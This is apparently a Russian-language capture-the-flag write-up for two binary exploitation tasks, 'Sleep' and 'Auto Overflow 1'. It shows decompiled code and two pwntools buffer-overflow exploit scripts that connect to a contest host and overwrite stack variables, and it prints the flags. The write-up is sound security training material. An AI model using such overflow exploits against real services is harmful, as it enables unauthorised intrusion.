# PWN. Analysis of tasks solving from forkbomb

* Sleep
* Auto Overflow 1

## Sleep
Откроем исполняемчый файл в Cutter и в функции `main` увидим следующее:
```
    undefined8 main(void)
    {
    char *buf;
    int s;
    
    alarm(5);
    s = 0x400;
    printf("Enter your name: ");
    read(0, &buf, 0x400);
    printf("Hello %s! You will get your flag in %d seconds\n", &buf, s);
    sleep(s);
    system("cat /flag");
    return 0;
    }
```
Проанализировав код, приходим к выводу, что необходимо перетереть переменную `s`, отвечающую за время, через которое нам выдадут флаг.
Также это нужно сделать менее, чем за 5 секунд, ведь, из-за команды `alarm(5)`, программа завершится. Напишем следующий эксплойт при помощи `pwntools`:
```
from pwn import *

exe = context.binary = ELF('./path-to-binary')

host = args.HOST or '109.233.56.90'
port = int(args.PORT or 11576)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

io = start()
io.recvuntil(b'Enter your name: ')
load = b'\0'*272
io.send(load)
io.interactive()

```
Теперь осталось лишь запустить эксплойт: `python3 exploit-name.py` и получить **флаг: spbctf{beep_boop_overflow_int_variable}**

## Auto Overflow 1
Откроем исполняемый файл в Cutter и посмотрим на функцию `main`:
```
undefined4 main(void)
{
    undefined4 uVar1;
    int32_t iVar2;
    int var_88h;
    int var_84h;
    int var_80h;
    int var_7ch;
    char *var_78h;
    int var_6ch;
    int var_64h;
    int var_60h;
    int var_5ch;
    int var_58h;
    int var_54h;
    char verify [65];
    int rnd;
    
    // int main();
    uVar1 = time(0);
    srand(uVar1);
    uVar1 = rand();
    sprintf(verify, 0x4008e4, uVar1);
    printf("Welcome to Битва Экстрасенсов.\n");
    printf("OK, here\'s the deal.\n");
    printf("We want you to set the value of string1 to \'%s\'.\n", verify);
    printf("And you only have 1 second to check your superspeed.\n");
    alarm(1);
    printf("Give me your input: ");
    gets(input);
    iVar2 = strcmp(string1, verify);
    if (iVar2 == 0) {
        printf("Yissss!\n");
        printf("Flag is: spbctf{******************************}\n");
    } else {
        printf("YOU FAILED\n");
        printf("Because, here\'s the target string: \'%s\'\n", verify);
        printf("      And here\'s the your string1: \'%s\'\n\n", string1);
        printf("See the difference?\n");
    }
    return 0;
}
```
Проведя анализ, понимаем, что нужно менее чем за 1 секунду отправить 64 "мусорных байта", а затем изменить строку на требуюмую. Это можно сдлеать при помощи всеми любимого `pwntools`:
```
from pwn import *

exe = context.binary = ELF('path-to-binary')

host = args.HOST or '109.233.56.90'
port = int(args.PORT or 11587)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

io = start()

io.recvuntil(b"string1 to '")
need = io.recvuntil(b"'")
need = need[0:-1]
load = b'A'*64 + need
io.sendline(load)

io.interactive()

```
Теперь запустим эксплойт: `python3 exploit-name.py` и получаем **флаг: spbctf{how_d1d_y0u_l1ke_the_g37s_func}**
